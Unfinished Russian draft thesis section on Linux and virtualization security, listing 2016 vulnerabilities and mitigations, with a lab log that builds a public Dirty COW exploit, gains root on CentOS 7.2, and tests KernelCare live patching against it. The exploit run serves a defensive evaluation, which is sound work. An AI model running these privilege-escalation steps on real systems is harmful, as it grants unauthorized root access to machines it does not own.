\section{ОПИСАНИЕ РАБОТЫ, ПОКА ХЗ ЧТО ТУТ}

Пока я только знаю что тут примерно 20 страниц должно быть. Тут само исследование работы.

Все это должно быть с подпунктами.

почему именно linux и эти платформы?
нужно собрать статистику использования дистрибутивов на серверах, а также платформ виртуализации
возможно конкретно по россии эту цифру найти?

Уязвимости 2016, это нужно эксплуатировать

* Linux kernel, CentOS/RHEL/buntu/Debian Dirty COW

* Виртуализация: KVM/Xen/LXC/OpenVZ/Virtuozzo/VMWare/Hyper-V

* Протоколы: NTP/SSL/TLS/HTTP2 DROWN/POODLE/HEARTBLEED TCP overflow libc GHOST

* mysql cve-2016-3477

чтобы не ребутаться использовать kernelcare/kpatch, постоянно мониторинг уязвимостей

использовать lts дистрибутивы для поддержки софта

пример уязвимостей по kvm: http://www.cvedetails.com/

ntp - только на винде позволяет устроить ддос

есть drown до этого еще poodle и heartbleed, это все уязвимости openssl, после этого появился libressl - она сложна в реализации http://www.opennet.ru/opennews/art.shtml?num=43971

нашумевшие еще это ghost, shellshock, CVE-2016-6663 (mysql)
--- конкретно

+ Linux kernel DIrty COW: CVE-2016-5195 http://www.opennet.ru/opennews/art.shtml?num=45354
получить рута можно

+ Xen CVE-2016-6258 http://www.opennet.ru/opennews/art.shtml?num=44855
выполнение произвольного кода на хост-ноде

+ TCP CVE-2016-5696 http://www.opennet.ru/opennews/art.shtml?num=44945
возможность обрыва tcp-соединения и подстановки данных в трафик

- glibc CVE-2015-7547 http://opennet.ru/opennews/art.shtml?num=43886
ее вряд ли можно эксплуатировать

+ xen CVE-2016-3710 http://www.opennet.ru/opennews/art.shtml?num=44409
работает только в hvm, выполнение кода на хост-ноде из гостевой

+ linux kernel CVE-2016-8655 http://www.opennet.ru/opennews/art.shtml?num=45632
тут возможно выйти за пределы lxc скорее всего

---

Тестовый стенд для всего этого.
лучше конечно это был бы дедик, но на крайняк kvm + nestedV

если все это можно эксплуатировать, то что делать?

* мониторинг

* если это что-то ядерное, то надо ребутать, так не пойдет, нужны патчи налету

* использование встроенных механизмов защиты selinux/apparmor

если связать это с опенсорсом, то

1. все источники уязвимостей из открытых данных

2. эксплуатация уязвимостей тоже осуществляется с помощью свободного ПО

3. если это мониторинг, то скорее всего он тоже опенсорсный, но надо поискать если ли коммерческие альтернативы

Поискать скрипты, которые могут по открытым базам чекать уязвимости.
Эту возможность можно запихнуть в мониторинг.


Дальше.
Обзор наших провайдеров.
Какие требования к ним предъявляются и как они их выполняют.
Тут надо собрать стату по популярным облачным ребятам, почитать SLA и триальную услугу попробовать.

Если же речь идет не только об уязвимостях, но например еще о ддос, то тут помимо очевидного варианта атаки на инфраструктуру может быть, что в облаке клиента может быть зараза и это исходящий ддос.
Это надо тоже как-то мониторить, решать это можно либо заблокировав клиента, либо если это легитимный трафик, то что-то делать с сетью.

Также в безопасность входят бекапы, фейловеры, все что соответствует SLA.
Тут возможно сделать что-то с SDN и SDS, надо почитать.


\begin{lstlisting}
ETO CHISTIJ ISO CENTOS 7.2

[root@master ~]# cat /etc/redhat-release
CentOS Linux release 7.2.1511 (Core)
[root@master ~]# uname -r
3.10.0-327.el7.x86_64
[root@master ~]# su dcow
[dcow@master ~]$ id
uid=1000(dcow) gid=1000(dcow) groups=1000(dcow) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[dcow@master ~]$ git clone https://github.com/gbonacini/CVE-2016-5195.git
[dcow@master ~]$ cd CVE-2016-5195/
[dcow@master CVE-2016-5195]$ make
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil
[dcow@master CVE-2016-5195]$ ./dcow
Running ...
Received su prompt (Password: )
Root password is:   dirtyCowFun
Enjoy! :-)
[dcow@master CVE-2016-5195]$ su root
Password:
[root@master ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023


[root@master ~]# rpm -i http://patches.kernelcare.com/kernelcare-latest.el6.x86_64.rpm
[root@master ~]# /usr/bin/kcarectl --info
kpatch-state: patch is applied
kpatch-for: Linux version 3.10.0-327.el7.x86_64 (builder@kbuilder.dev.centos.org) (gcc version 4.8.3 20140911 (Red Hat 4.8.3-9) (GCC) ) #1 SMP Thu Nov 19 22:10:57 UTC 2015
kpatch-build-time: Mon Nov  7 17:08:08 2016
kpatch-description: 20;3.10.0-327.36.3.el7.x86_64
[root@master ~]# /usr/bin/kcarectl --update
Kernel is safe
[root@master ~]# /usr/bin/kcarectl --uname
3.10.0-327.36.3.el7.x86_64
[root@master ~]# /usr/bin/kcarectl --patch-info  | grep CVE-2016-5195 -A3 -B3
kpatch-name: 3.10.0/0001-mm-remove-gup_flags-FOLL_WRITE-games-from-__get_user-327.patch
kpatch-description: mm: remove gup_flags FOLL_WRITE games from __get_user_pages()
kpatch-kernel: >kernel-3.10.0-327.36.2.el7
kpatch-cve: CVE-2016-5195
kpatch-cvss: 6.9
kpatch-cve-url: https://access.redhat.com/security/cve/cve-2016-5195
kpatch-patch-url: https://git.kernel.org/linus/19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619

[root@master ~]# uname -r
3.10.0-327.el7.x86_64


PROVEROCHKA
[dcow@master CVE-2016-5195]$ ./dcow
Running ...
NE RABOTAET

4$/YEAR ZA 1 LICENZIUY

OTKLUYCHAEM
[root@master ~]# /usr/bin/kcarectl --unload
Updates already downloaded
KernelCare protection disabled, kernel might not be safe
[root@master ~]# su - dcow
Last login: Wed Dec  7 17:18:42 MSK 2016 on pts/0
[dcow@master ~]$ cd CVE-2016-5195/
[dcow@master CVE-2016-5195]$ ./dcow
Running ...
Received su prompt (Password: )
Root password is:   dirtyCowFun
Enjoy! :-)

\end{lstlisting}
\clearpage
